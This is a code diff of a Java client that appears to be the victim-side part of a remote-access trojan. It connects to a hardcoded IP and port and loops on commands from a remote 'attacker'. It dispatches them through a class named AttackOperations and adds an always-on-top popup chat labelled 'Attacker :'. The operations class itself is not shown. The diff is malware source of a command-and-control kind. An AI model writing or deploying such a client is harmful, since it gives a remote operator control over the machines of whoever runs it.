@@ -1,12 +1,21 @@
 import java.net.*;
+
+import javax.swing.JFrame;
+import javax.swing.JOptionPane;
+
 import java.io.*;
 public class Client {
 	
-	ChatWithServer cws = new ChatWithServer();
-	
 	public void ConnectToServer(){
+		
+		JFrame j=new JFrame();
+		j.setAlwaysOnTop(true);
+		j.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+		j.setVisible(true);
+		j.setVisible(false);
+		
 		try{
-			int port = 25000;
+			int port = 25001;
 			String ip = "172.16.60.43";
 			Socket s = new Socket(ip,port);
 			DataInputStream din = new DataInputStream(s.getInputStream());
@@ -15,7 +24,7 @@ public class Client {
 			AttackOperations op = new AttackOperations();
 			String send="",recive="";
 			
-			while(!recive.equals("stop")){
+			while(!recive.equals("end")){
 				
 				recive = din.readUTF();
 				
@@ -47,10 +56,22 @@ public class Client {
 				}
 				else if(recive.equals("chat")){
 					try{
-						cws.Chat(ip,port+1);
+						//chat
+						dout.writeUTF("chat connected..");
+						
+						while(!recive.equals("stop")){
+							String temp = "Attacker :";
+							recive = din.readUTF();
+							temp+=recive;
+							send = JOptionPane.showInputDialog(j,temp);
+							dout.writeUTF(send);
+						}
+						
+						
 					}
 					catch (Exception e){
-						System.out.println("here");
+						dout.writeUTF("stop");
+						dout.flush();
 					}
 				}
 				
